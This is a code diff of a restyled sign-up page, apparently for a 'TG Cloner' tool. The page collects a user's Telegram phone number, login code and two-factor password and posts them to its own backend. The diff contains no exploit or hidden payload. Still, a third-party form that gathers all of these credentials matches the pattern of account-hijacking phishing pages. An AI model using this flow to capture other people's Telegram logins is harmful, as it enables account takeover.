@@ -1,101 +1,319 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Signup</title>
+    <title>TG Cloner - Sign Up</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
+
+        :root {
+            --bg-color: #121212;
+            --primary-color: #1e1e1e;
+            --secondary-color: #2d2d2d;
+            --accent-color: #3a7bd5;
+            --font-color: #e0e0e0;
+            --input-bg: #252525;
+            --border-radius: 8px;
+            --error-color: #cf6679;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--font-color);
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background-color: var(--primary-color);
+            padding: 40px;
+            border-radius: var(--border-radius);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .container:hover {
+            transform: translateY(-5px);
+        }
+        
+        h1 {
+            color: var(--font-color);
+            margin-bottom: 20px;
+            font-weight: 400;
+        }
+
+        .form-step {
+            display: none;
+        }
+
+        .form-step.active {
+            display: block;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 400;
+        }
+
+        input[type="number"],
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--input-bg);
+            border: 1px solid var(--secondary-color);
+            border-radius: var(--border-radius);
+            color: var(--font-color);
+            font-size: 1rem;
+            box-sizing: border-box;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        input[type="number"]:focus,
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: var(--accent-color);
+            box-shadow: 0 0 8px rgba(58, 123, 213, 0.3);
+        }
+        
+        .btn {
+            background-color: var(--accent-color);
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            width: 100%;
+            font-size: 1rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+        }
+
+        .btn:hover {
+            background-color: #2968c8;
+            transform: translateY(-2px);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .error-message {
+            color: var(--error-color);
+            font-size: 0.9rem;
+            margin-top: 10px;
+            visibility: hidden;
+            height: 20px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        
+        .error-message.visible {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        .loader {
+            border: 4px solid var(--secondary-color);
+            border-top: 4px solid var(--accent-color);
+            border-radius: 50%;
+            width: 25px;
+            height: 25px;
+            animation: spin 1s linear infinite;
+            display: none;
+            margin: 20px auto 0;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <h1>Sign Up</h1>
+
+        <form id="signup-form">
+            <div id="step-number" class="form-step active">
+                <div class="form-group">
+                    <label for="num">Your Phone Number</label>
+                    <input type="text" id="num" placeholder="+1234567890" required>
+                </div>
+                <button type="button" class="btn" onclick="requestVerificationCode()">Send Code</button>
+            </div>
+
+            <div id="step-code" class="form-step">
+                <div class="form-group">
+                    <label for="codelgn">Verification Code</label>
+                    <input type="number" id="codelgn" required>
+                </div>
+                <button type="button" class="btn" onclick="submitVerificationCode()">Verify Code</button>
+                <p id="wrngcode" class="error-message">Wrong code! Please try again.</p>
+            </div>
+
+            <div id="step-password" class="form-step">
+                <div class="form-group">
+                    <label for="pwdf">Two-Factor Password</label>
+                    <input type="password" id="pwdf" required>
+                </div>
+                <button type="button" class="btn" onclick="submitPassword()">Sign In</button>
+                <p id="wrngpwd" class="error-message">Wrong password! Please try again.</p>
+            </div>
+        </form>
+        <div id="loader" class="loader"></div>
+    </div>
+
     <script>
+        const loader = document.getElementById('loader');
+
+        function showStep(stepId) {
+            document.querySelectorAll('.form-step').forEach(step => {
+                step.classList.remove('active');
+            });
+            document.getElementById(stepId).classList.add('active');
+        }
+
+        function showLoader(show) {
+            loader.style.display = show ? 'block' : 'none';
+        }
         
-        function cd(){
-            let code = document.getElementById("code")
-            code.style.visibility = 'visible'
-            hash()
+        function showErrorMessage(elementId, show) {
+            const el = document.getElementById(elementId);
+            if (show) {
+                el.classList.add('visible');
+            } else {
+                el.classList.remove('visible');
+            }
         }
 
-        function hash(){
-            let numtel = parseInt(document.getElementById("num").value)
-            const data = JSON.stringify({
-                telphon: numtel
-            })
+        async function requestVerificationCode() {
+            const phoneInput = document.getElementById("num");
+            if (!/^\+\d+$/.test(phoneInput.value)) {
+                alert("Please enter a valid phone number in international format (e.g., +1234567890).");
+                return;
+            }
 
-            fetch('/api/signup/tglogin/number',{
+            showLoader(true);
+            const data = JSON.stringify({
+                telphon: phoneInput.value
+            });
+
+            try {
+                await fetch('/api/signup/tglogin/number', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: data
-            })
+                });
+                showStep('step-code');
+            } catch (error) {
+                console.error("Error sending verification code request:", error);
+                alert("An error occurred. Please try again later.");
+            } finally {
+                showLoader(false);
+            }
         }
-        async function sendcode(){
-            let codeform = (document.getElementById("codelgn").value)
-            let warn = document.getElementById("wrngcode")
-            warn.style.visibility = 'hidden'
+
+        async function submitVerificationCode() {
+            const codeInput = document.getElementById("codelgn");
+            showErrorMessage('wrngcode', false);
+            showLoader(true);
+
             const data = JSON.stringify({
-                codef: codeform
-            })
-            const response = await fetch('/api/signup/tglogin/code',{
+                codef: codeInput.value
+            });
+
+            try {
+                const response = await fetch('/api/signup/tglogin/code', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: data
-            })
-            const check = await response.json()
-            if (check.status === 'password_needed'){
-                let psswd = document.getElementById("password")
-                let code = document.getElementById("code")
-                let init = document.getElementById('form2')
-                let btnsend = document.getElementById('btn')
-                code.style.visibility = 'hidden'
-                init.style.visibility = 'hidden'
-                psswd.style.visibility = 'visible'
-                btnsend.value = 'Resend code'
-            }
-            if(check.status === 'wrong_code'){
-                let warn = document.getElementById("wrngcode")
-                warn.style.visibility = 'visible'
+                });
+
+                if (response.redirected) {
+                    window.location.href = response.url;
+                    return;
+                }
+
+                const result = await response.json();
+                if (result.status === 'password_needed') {
+                    showStep('step-password');
+                } else if (result.status === 'wrong_code') {
+                    showErrorMessage('wrngcode', true);
+                }
+            } catch (error) {
+                console.error("Error verifying code:", error);
+                const text = await error.text();
+                if (text.includes("RedirectResponse")) {
+                    window.location.href = "/home";
+                } else {
+                    alert("An error occurred while verifying the code.");
+                }
+            } finally {
+                showLoader(false);
             }
         }
-        async function loginpwd() {
-            let pwdform = (document.getElementById("pwdf").value)
-            let wrong = document.getElementById("wrngpwd")
-            wrong.style.visibility = 'hidden'
+
+        async function submitPassword() {
+            const passwordInput = document.getElementById("pwdf");
+            showErrorMessage('wrngpwd', false);
+            showLoader(true);
+
             const data = JSON.stringify({
-                password: pwdform
-            })
+                password: passwordInput.value
+            });
+            
+            try {
             const response = await fetch("/api/signup/tglogin/pwd", {
                 method: 'POST',
-                headers: {'Content-Type':'application/json'},
+                    headers: {'Content-Type': 'application/json'},
                 body: data
-            })
-            const check = await response.json()
-            if(check.status === 'wrong_pwd'){
-                let wrong = document.getElementById("wrngpwd")
-                wrong.style.visibility = 'visible'
+                });
+
+                if (response.redirected) {
+                    window.location.href = response.url;
+                    return;
+                }
+
+                const result = await response.json();
+                if (result.status === 'wrong_pwd') {
+                    showErrorMessage('wrngpwd', true);
+                }
+            } catch (error) {
+                console.error("Error during password sign-in:", error);
+                const text = await error.text();
+                if (text.includes("RedirectResponse")) {
+                     window.location.href = "/home";
+                } else {
+                    alert("An error occurred during sign-in.");
+                }
+            } finally {
+                showLoader(false);
             }
         }
     </script>
-    <form>
-        <div id="form2" style="visibility: visible;">
-            <label>You number:</label>
-            <input type="number" id="num" required>
-            <br>
-            <input type="button" value="Send code" onclick="cd()" id="btn">
-            <div id="code" style="visibility: hidden;">
-                The code:
-                <input type="number" id="codelgn">
-                <br>
-                <input type="button" value="Verify code" onclick="sendcode()" required>
-                <br>
-                <h3 id="wrngcode" style="visibility: hidden;">Wrong code! Try again.</h3>
-            </div>
-            <div id="password" style="visibility: hidden;">
-                Your password:
-                <input type="text" id="pwdf">
-                <br>
-                <input type="button" value="Sign In" onclick="loginpwd()">
-                <br>
-                <h3 id="wrngpwd" style="visibility: hidden;">Wrong Password</h3>
-            </div>
-        </div>
-    </form>
 </body>
 </html>
